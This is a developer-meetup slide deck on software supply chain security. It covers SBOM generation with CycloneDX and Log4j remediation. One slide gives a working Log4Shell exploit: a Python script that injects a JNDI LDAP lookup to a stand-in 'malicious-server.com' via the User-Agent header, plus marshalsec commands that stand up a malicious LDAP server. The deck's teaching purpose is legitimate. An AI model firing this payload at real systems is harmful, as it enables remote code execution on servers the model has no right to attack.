---
marp: true
theme: default
header: "Software Secure Supply Chain"
footer: "Developer Meetup"
paginate: true
backgroundColor: #fff
---

# Software Secure Supply Chain

## Introduction

- Importance of secure supply chains
- Key concepts and practices

---

## Early Software Supply Chains

### Example: Perl and C CGI Scripts

#### Perl CGI Example

```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "<html><body>Hello, World!</body></html>";
```

#### C CGI Example

```c
#include <stdio.h>

int main() {
    printf("Content-Type: text/html\n\n");
    printf("<html><body>Hello, World!</body></html>");
    return 0;
}
```

- No external dependencies
- Simple, isolated scripts

---

## Introduction of Dependencies

### Late 1990s - Early 2000s

- Use of libraries like `cgi-bin`, `Mail::Form` in Perl
- Increased functionality, but also new vulnerabilities

#### Perl with Dependencies

```perl
use CGI;
my $q = CGI->new;
print $q->header, $q->start_html('Hello World');
print $q->h1('Hello, World!');
print $q->end_html;
```

- Introduction of CVEs (Common Vulnerabilities and Exposures)

---

## The Birth of Secure Software Development Lifecycle (SDLC)

- Early 2000s: Organizations start adopting SDLC best practices
- Focus on identifying and mitigating vulnerabilities early in the development process

---

## Modern Frameworks: SSDF and SLSA

### SSDF (Secure Software Development Framework)

- Framework for integrating security practices into software development

### SLSA (Supply Chain Levels for Software Artifacts)

- Framework for ensuring the integrity of software artifacts

#### Components

- **SBOM** (Software Bill of Materials)
- **Sigstore** for signing and verifying software

---

## Examples: Identifying and Remediating Vulnerabilities

### Java Example: Log4j CVE

#### Identifying CVE in Log4j

1. **Create a Sample Java Project with a Vulnerable Log4j Dependency**

```bash
mkdir log4j-example
cd log4j-example
mvn archetype:generate -DgroupId=com.example -DartifactId=log4j-example -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false
cd log4j-example
```

2. **Add the Vulnerable Log4j Dependency to `pom.xml`:**

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.1</version> <!-- Vulnerable version -->
    </dependency>
</dependencies>
```

3. **Create a Sample Java File:**

```java
package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        logger.info("Hello, World!");
    }
}
```

4. **Compile and Run the Project:**

```bash
mvn package
java -cp target/log4j-example-1.0-SNAPSHOT.jar com.example.App
```

#### Using SBOM to Identify the CVE

1. **Generate SBOM Using CycloneDX Maven Plugin:**

Add the CycloneDX Maven plugin to your `pom.xml`:

```xml
<build>
    <plugins>
        <plugin>
            <groupId>org.cyclonedx</groupId>
            <artifactId>cyclonedx-maven-plugin</artifactId>
            <version>2.7.4</version>
            <executions>
                <execution>
                    <goals>
                        <goal>makeAggregateBom</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

2. **Generate the SBOM:**

```bash
mvn cyclonedx:makeAggregateBom
```

3. **Analyze the SBOM:**

The SBOM will be generated in `target/bom.xml`. You can use tools like Dependency-Track or CycloneDX CLI to analyze the SBOM and identify CVEs.

```bash
cycloneDXBomUtility analyze -i target/bom.xml
```

---

### Exploiting the Log4j Vulnerability

#### Python Script to Exploit Log4j CVE-2021-44228:

```python
import requests

# Target URL
url = "http://localhost:8080"  # Adjust to the target's actual address

# Malicious payload
payload = '${jndi:ldap://malicious-server.com/a}'

# Sending the payload
headers = {
    'User-Agent': payload
}

response = requests.get(url, headers=headers)
print("Exploit sent, check your LDAP server for interactions.")
```

#### Running the Exploit

1. **Set Up a Malicious LDAP Server:**

You can use a tool like `marshalsec` to set up a malicious LDAP server that serves the payload.

```bash
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-malicious-server.com/#Exploit"
```

2. **Run the Exploit Script:**

```bash
python exploit_log4j.py
```

---

### Remediation

To remediate the Log4j vulnerability, update to a non-vulnerable version (e.g., 2.17.0).

1. **Update `pom.xml`:**

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.17.0</version> <!-- Safe version -->
    </dependency>
</dependencies>
```

2. **Rebuild and Redeploy the Project:**

```bash
mvn clean package
java -cp target/log4j-example-1.0-SNAPSHOT.jar com.example.App
```

---

## Conclusion

- Importance of secure software supply chains
- Adopting frameworks like SSDF and SLSA
- Utilizing tools like SBOM and Sigstore for a secure foundation

---

# Thank You!

- Questions and Discussion